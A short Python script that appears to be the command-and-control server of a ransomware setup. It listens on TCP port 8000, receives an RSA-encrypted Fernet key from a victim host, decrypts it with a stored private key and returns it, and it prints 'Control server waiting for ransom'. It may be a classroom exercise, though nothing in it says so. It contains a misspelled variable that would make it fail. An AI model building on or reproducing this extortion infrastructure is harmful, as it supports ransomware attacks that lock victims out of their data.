from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet
import socketserver

#receive an asym
class ClientHandler(socketserver.BaseRequestHandler):
    def handle(self):#
        encrypted_key=self.request.recv(2048).strip()
        #print('Implement decryption of data '+encrypted_key)
        print('Encrypted key received by host : {}'.format(self.client_address[0]))
        with open('receivedkey.key','wb') as file:
            file.write(encryptded_key)

        #--------------------
        # decryption code here
        with open('private.pem','rb') as file:
            private_key=serialization.load_pem_private_key(
                file.read(),
                None
            )
        
        decrypted_key=private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        #--------------------
        self.request.sendall(decrypted_key)
    
#===================================================>

if __name__=='__main__':
    HOST,PORT='',8000
    tcpserver=socketserver.TCPServer((HOST,PORT),ClientHandler)
    try:
        print('Control server waiting for ransom ...')
        tcpserver.serve_forever()
    except Exception as e:
        print('There was an error : {}'.format(e))
